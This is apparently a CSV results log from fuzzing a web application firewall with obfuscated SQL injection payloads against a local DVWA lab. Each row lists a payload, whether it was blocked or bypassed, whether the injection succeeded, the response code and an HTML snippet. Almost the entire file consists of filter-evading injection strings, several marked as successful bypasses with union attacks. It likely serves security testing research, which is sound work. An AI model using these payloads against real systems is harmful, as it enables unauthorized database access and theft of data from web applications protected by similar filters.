Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@=1.+or+{x+(select+1)}=1+like+{x%0b(select+1)}=1%23,Blocked,No,None,Invalid,0.0332,72.85,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or%0bnot+1=+(not%0b{`if`%0b1}=1),Bypassed,No,None,Invalid,0.0354,72.85,No,500,
0'<@=1.%0bor+!%7e0=+(not%0b{a+1}=1),Bypassed,No,None,Invalid,0.0252,72.85,No,500,
0%27<@!=1+||%0bnot%0b1=+(not%0b{a+1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.0205,72.98,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||%0b!+1=%0b(not%0b{a+1}=1),Bypassed,No,None,Invalid,0.0209,73.11,No,500,
0%27<@!=.1%0b||%0b!+{x%0b(select+1)}=1=%0b(false),Bypassed,Yes,Yes (unionAtk),Invalid,0.0168,73.11,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+!+{`if`+1}=1=%0b(not%0btrue),Bypassed,Yes,Yes (unionAtk),Invalid,0.03,73.11,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+!%0b{`if`%0b1}=1=%0b(not%0b{a%0b1}=1,Bypassed,No,None,Invalid,0.0284,73.11,No,500,
0%27<@=.1+or%0bnot+{a%0b1}=1=+(!%7efalse),Bypassed,Yes,Yes (unionAtk),Invalid,0.0237,73.11,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor+not+{x+(select+1)}=1=%0b(!%0b,Bypassed,No,None,Invalid,0.0186,73.11,No,500,
0%27<@!=.1+||+!%7e0=+(not+{x+(select%0b1)}=1,Blocked,No,None,Invalid,0.009,73.11,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1+||%0bnot%0b{x+(select%0b1)}=1=+(!%0b{x,Blocked,No,None,Invalid,0.0215,73.11,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+or%0b!+{x%0b(select+1)}=1=+(0),Bypassed,No,None,Invalid,0.0354,73.11,No,500,
0'<@=.1%0b||+not+{x%0b(select%0b1)}=1=%0b(not%0b1,Bypassed,No,None,Invalid,0.014,73.11,No,500,
0%27<@=.1+||+not+{`if`%0b1}=1=+(!+{x%0b(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0201,73.11,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||+not+{a+1}=1=%0b(not%0b{a+1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0217,73.11,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+not%0b{x+(select+1)}=1=+(!%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0166,73.11,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'||%0b!@<@.%0bor%0b{x+(select+1)}=1+like+{a+1}=1,Bypassed,No,None,Invalid,0.0319,73.11,No,500,
0%27<@!=1.+or+not+{`if`%0b1}=1=%0b(not%0b{x%0b(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0176,73.11,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor%0b!%0b{`if`%0b1}=1=+(!%0b{a+1}=1,Bypassed,No,None,Invalid,0.0127,73.11,No,500,
0%27<@=.1+||%0b!+{x+(select+1)}=1=+(not%0b{x,Blocked,No,None,Invalid,0.0179,73.11,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0b||+!+{a%0b1}=1=%0b(not+{`if`+1}=1,Bypassed,No,None,Invalid,0.0313,73.11,No,500,
0'<@!=.1+or%0b!%0b{a%0b1}=1=+(!%0b{`if`+1}=1,Bypassed,No,None,Invalid,0.0295,73.11,No,500,
0'<@=.1%0bor%0b!%0b{`if`%0b1}=1=%0b(!%0b{`if`%0b1}=1,Bypassed,No,None,Invalid,0.0442,73.11,No,500,
0'<@=.1%0bor%0b!+true=%0b(!%0b{x+(select+1)}=1,Bypassed,No,None,Invalid,0.0492,73.11,No,500,
0%27<@!=1.+or+!+{x%0b(select+1)}=1=+(not+{`if`,Bypassed,Yes,Yes (unionAtk),Invalid,0.0244,73.44,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1%0bor%0bnot%0b{x+(select+1)}=1=+(not+{x,Bypassed,No,None,Invalid,0.0371,73.77,No,500,
0%27<@!=.1%0bor+!~false=+(!+{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0276,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||%0b!+true=+(!+{x+(select%0b1)}=1,Bypassed,No,None,Invalid,0.0229,73.77,No,500,
0%27<@!=1.%0bor%0bnot%0b{a%0b1}=1=%0b(!%0b{`if`+1}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0158,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor%0bnot%0b{x%0b(select+1)}=1=%0b(0),Bypassed,Yes,Yes (unionAtk),Invalid,0.0386,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||+not%0b{a%0b1}=1=+(not%0b{x+(select,Bypassed,Yes,Yes (unionAtk),Invalid,0.0839,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor%0b!%0b{x+(select+1)}=1=%0b(not%0b{`if`,Bypassed,No,None,Invalid,0.044,73.77,No,500,
0%27<@=.1%0b||%0b!%0b{a+1}=1=+(false)+||,Bypassed,Yes,Yes (unionAtk),Invalid,0.0305,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||%0b!+true=%0b(not+{x%0b(select+,Bypassed,No,None,Invalid,0.0231,73.77,No,500,
0%27<@=1+||+not%7efalse=%0b(not%0b{x%0b(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0189,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or+!+{`if`%0b1}=1=%0b(not%7efalse),Bypassed,Yes,Yes (unionAtk),Invalid,0.0314,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+{x%0b(select%0b1)}=1+like+{`if`%0b1}=1+||',Bypassed,No,None,Invalid,0.0344,73.77,No,500,
0'<@!=1.+||+not%0b{x+(select%0b1)}=1=+(not+{a,Bypassed,No,None,Invalid,0.0299,73.77,No,500,
0'<@!=1.+or%0bnot%0b{x%0b(select+1)}=1=%0b(not%0btrue,Blocked,No,None,Invalid,0.0093,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.%0bor%0b!+{x%0b(select+1)}=1=+(not+{a,Bypassed,No,None,Invalid,0.0112,73.77,No,500,
0'<@=.1+or%0bnot%0b1=+(!+{x+(select%0b1)}=1,Blocked,No,None,Invalid,0.0201,73.77,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0bor%0b!%7e0=%0b(not%0b{x%0b(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.035,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or+1<@.%0bor+not%0b1=%0b(not%0b{a+,Bypassed,No,None,Invalid,0.0172,73.77,No,500,
0%27<@=1.+||+!+{`if`%0b1}=1=+(!%0b{x%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0181,73.77,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or+!+{`if`+1}=1=+(not+{x%0b(select,Bypassed,No,None,Invalid,0.0249,73.9,No,500,
0%27<@!=1.%0b||%0b{x+(select+1)}=1%0blike%0b{a+1}=1%0bor',Bypassed,No,None,Invalid,0.0408,74.03,No,500,
0%27<@=1.%0bor+not+{x%0b(select%0b1)}=1=%0b(not+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0327,74.03,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+!+{`if`+1}=1=+(not%0b{x+,Bypassed,No,None,Invalid,0.0128,72.85,No,500,
0%27<@=1.%0b||+not+{x%0b(select+1)}=1=+(0),Bypassed,Yes,Yes (unionAtk),Invalid,0.0301,72.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or%0bnot%0b{a+1}=1=%0b(not%0b{x+(select,Bypassed,No,None,Invalid,0.0301,72.85,No,500,
0%27<@!=1+||+not+1=+(!%0b{`if`+1}=1),Bypassed,Yes,Yes (unionAtk),Invalid,0.043,72.98,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+not+{a+1}=1=+(not%0b{x%0b,Bypassed,No,None,Invalid,0.0229,73.11,No,500,
0%27<@=1.%0bor%0bnot%0b1=+(!%0btrue)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0317,73.11,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+!%0btrue=%0b(not+{x%0b(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Invalid,0.0168,73.11,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
